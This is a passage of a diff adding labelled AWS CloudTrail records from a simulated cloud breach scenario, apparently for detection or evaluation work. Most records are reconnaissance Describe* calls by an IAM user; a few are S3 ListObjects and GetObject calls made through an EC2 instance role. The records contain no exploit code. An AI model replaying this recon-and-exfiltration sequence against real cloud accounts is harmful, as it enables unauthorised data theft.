+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 63,
+            "event_id": "052b798c-e210-4e2f-8462-34dc448ee26b"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-0da6d6ea7603b580432d9b74",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAddresses",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "i-0317f6c6b66ae9c40"
+                      }
+                    ]
+                  },
+                  "name": "instance-id"
+                }
+              ]
+            },
+            "allocationIdsSet": {},
+            "publicIpsSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 64,
+            "event_id": "61bd7b2e-72c1-455a-9736-c05528bafeb1"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-e6c0bb532eddcc48e6231265",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:41.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeClassicLinkInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "instancesSet": {
+              "item": [
+                {
+                  "instanceId": "i-044b1baf4c96e1b62"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 65,
+            "event_id": "80b56b93-acfa-4aa4-8562-c4cd2eae3654"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-3e5c1eb21af2237c6fc635d6",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceAttribute",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "attribute": "disableApiTermination",
+            "instanceId": "i-0317f6c6b66ae9c40"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 66,
+            "event_id": "c21afb56-c61a-4a4d-8568-0197eac184ea"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-d409fbe7ba7acc31a31aa6cf",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:44.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-0317f6c6b66ae9c40"
+                }
+              ]
+            },
+            "includeAllInstances": true,
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 67,
+            "event_id": "bd13bf66-fccc-433f-be89-e54d4c5708d0"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-2e2bd6fc178e153306c3b507",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-0317f6c6b66ae9c40"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 68,
+            "event_id": "47c1b524-8acb-4000-89cc-77666d5c3f42"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-4b1920e20e621d293c1d061c",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:44.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "attaching"
+                      }
+                    ]
+                  },
+                  "name": "attachment.status"
+                }
+              ]
+            },
+            "volumeSet": {
+              "items": [
+                {
+                  "volumeId": "vol-04a7b7a66795fa279"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 69,
+            "event_id": "5b7dbaf6-02ae-4cfd-b001-6f686c578836"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-3ffb3ae964d34911616be39d",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumeStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "impaired"
+                      }
+                    ]
+                  },
+                  "name": "volume-status.status"
+                },
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "io-enabled"
+                      }
+                    ]
+                  },
+                  "name": "volume-status.details-name"
+                },
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "failed"
+                      }
+                    ]
+                  },
+                  "name": "volume-status.details-status"
+                }
+              ]
+            },
+            "volumeSet": {
+              "items": [
+                {
+                  "volumeId": "vol-04a7b7a66795fa279"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 70,
+            "event_id": "0bd33dc5-e7cf-46a0-80aa-c772fb0a6189"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-0b2d0b91af9eac363229278d",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:41.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAddresses",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "i-044b1baf4c96e1b62"
+                      }
+                    ]
+                  },
+                  "name": "instance-id"
+                }
+              ]
+            },
+            "allocationIdsSet": {},
+            "publicIpsSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 71,
+            "event_id": "99a6b740-32ad-4038-83f7-033dc2b3b86a"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-f4f3b92be3552ae35fa334be",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:42.000Z",
+          "service": "monitoring.amazonaws.com",
+          "operation": "DescribeAlarms",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "excludeManagedAlarms": false,
+            "maxRecords": 100
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 72,
+            "event_id": "5ddc2c39-e5c7-4130-84fc-11755e9f5f80"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-e8d01a864f16d0e1daf40029",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:41.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAccountAttributes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "accountAttributeNameSet": {},
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 73,
+            "event_id": "4cc85d0b-89c1-4387-9796-cfec134eb32d"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-2e2dcd6720da1e91ac7c6741",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeClassicLinkInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "instancesSet": {
+              "item": [
+                {
+                  "instanceId": "i-0317f6c6b66ae9c40"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 74,
+            "event_id": "0fb7ad6d-d95b-4d7a-92e3-f917ad3a3f23"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-521ab0a0ae9eed4c68164958",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:41.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceCreditSpecifications",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "DescribeInstanceCreditSpecificationsRequest": {
+              "InstanceId": {
+                "tag": 1,
+                "content": "i-044b1baf4c96e1b62"
+              }
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 75,
+            "event_id": "25c6dc97-ec37-4ac0-8b80-73c53c8bced7"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-72f616956fa9390e8efaad63",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceCreditSpecifications",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "DescribeInstanceCreditSpecificationsRequest": {
+              "InstanceId": {
+                "tag": 1,
+                "content": "i-0317f6c6b66ae9c40"
+              }
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 76,
+            "event_id": "7404046f-0d0f-42dc-af38-1833120d0593"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-0ab273a5fb7e81c57fc797fe",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceCreditSpecifications",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "DescribeInstanceCreditSpecificationsRequest": {
+              "InstanceId": {
+                "tag": 1,
+                "content": "i-0317f6c6b66ae9c40"
+              }
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 77,
+            "event_id": "08528807-5f31-4eee-974e-c5a241685bf3"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-63e25e2194f85d96ec862b6d",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "compute-optimizer.amazonaws.com",
+          "operation": "GetEnrollmentStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": null,
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 78,
+            "event_id": "dfbb69c0-9279-45bb-91f7-786f7f8ff9ee"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-529845d44e1e8107b1f0b018",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T01:02:34.000Z",
+          "service": "s3.amazonaws.com",
+          "operation": "GetObject",
+          "actor_type": "AssumedRole",
+          "actor_id": "arn:aws:sts::123456789123:assumed-role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0/i-0317f6c6b66ae9c40",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "key": "ring.txt",
+            "Host": "mordors3stack-s3bucket-llp2yingx64a.s3.amazonaws.com",
+            "bucketName": "mordors3stack-s3bucket-llp2yingx64a"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 79,
+            "event_id": "771299cb-e200-4926-9604-c85358b30499"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-fcd11df26c4dd82579717d19",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T01:02:34.000Z",
+          "service": "s3.amazonaws.com",
+          "operation": "ListObjects",
+          "actor_type": "AssumedRole",
+          "actor_id": "arn:aws:sts::123456789123:assumed-role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0/i-0317f6c6b66ae9c40",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "prefix": "",
+            "encoding-type": "url",
+            "Host": "mordors3stack-s3bucket-llp2yingx64a.s3.amazonaws.com",
+            "list-type": "2",
+            "bucketName": "mordors3stack-s3bucket-llp2yingx64a"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 80,
+            "event_id": "2308e1b4-ed27-49fc-b6e4-cc9a612c1c13"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-5dc67fdadf71d00f17ffc0fe",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeLaunchTemplates",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "DescribeLaunchTemplatesRequest": {
+              "MaxResults": 1
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 81,
+            "event_id": "6b370685-beca-406d-8c8f-12923721a17e"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-02a857c1af55a9f94c1989df",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAvailabilityZones",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "availabilityZoneSet": {},
+            "availabilityZoneIdSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 82,
+            "event_id": "62409375-a381-4dcd-ad13-cebad66e9244"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-fe6599ce43bf396731badf82",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "volumeSet": {},
+            "filterSet": {},
+            "maxResults": 1000
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 83,
+            "event_id": "735a92c8-4bb5-4cc6-bc76-d4aaca9ebd8b"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-be505b69a6571ed74f59bd37",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumeStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 84,
+            "event_id": "0db359e8-bd02-4328-87c3-5ff2a5e1c5d5"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-55deed8ee8e0dc4c78a5e8f5",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeKeyPairs",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "keyPairIdSet": {},
+            "keySet": {},
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
